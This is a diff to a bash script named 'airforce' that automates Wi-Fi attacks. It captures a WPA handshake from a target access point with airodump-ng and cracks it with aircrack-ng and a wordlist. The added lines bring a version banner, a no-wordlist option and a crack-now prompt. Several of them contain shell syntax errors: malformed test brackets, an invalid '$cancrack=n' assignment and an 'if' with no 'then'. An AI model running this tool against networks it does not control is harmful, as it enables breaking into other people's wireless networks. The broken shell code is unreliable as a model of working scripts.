@@ -1,8 +1,17 @@
 #! /bin/bash
 
+version=1.1
+cancrack=y
+
 # Check if Parameters are set
 if [ "$2" = "" ]; then
+  echo "Airforce Version $version"
+  echo " "
   echo "Use: airforce [INTERFACE] [PATH/TO/PASSWORDLIST]"
+  echo "     airforce [INTERFACE] --no-wordlist"
+  echo ""
+  echo "www.GitHub.com/MrFlyingToasterman/airforce"
+  echo ""
   exit
 fi
 
@@ -10,6 +19,12 @@ fi
 if [ "$EUID" != "0" ]; then
     echo "[INFO] Please run as root"
     exit
+fi
+
+# Ceck for --no-wordlist
+if ["$2" = "--no-wordlist"]; then 
+    echo "[INFO] --no-wordlist detected"
+    $cancrack=n
 fi
 
 echo "Welcome to AirForce!"
@@ -36,13 +51,20 @@ echo "This speedup works way better with '-c clientbssid' at the end of the line
 read -n 1 -s -p "Press any key to start attack ..."
 
 airodump-ng -c $channel --bssid $target -w handshake $1mon --ignore-negative-one
+echo "[DONE] Catching handshake"
 
 echo "[INFO] Tagging Handshake ..."
 mv handshake-01.cap $target-handshake.cap
 
-echo "Start cracking!"
-echo "[WARNING] If you do not have a valid Handshake, you need to reexec airodump-ng until you get it!"
-aircrack-ng -w $2 -b $target $target-handshake.cap
+if ["$cancrack" = "y"];
+	echo "Start cracking now ? (y/N)"
+	read cracknow
+	if ["$cracknow" = "y"]; then
+		echo "[INFO] Start cracking"
+		echo "[WARNING] If you do not have a valid Handshake, you need to reexec airodump-ng until you get it!"
+		aircrack-ng -w $2 -b $target $target-handshake.cap
+	fi
+fi
 
 echo "[INFO] Restoring interfaces"
 airmon-ng stop $1mon
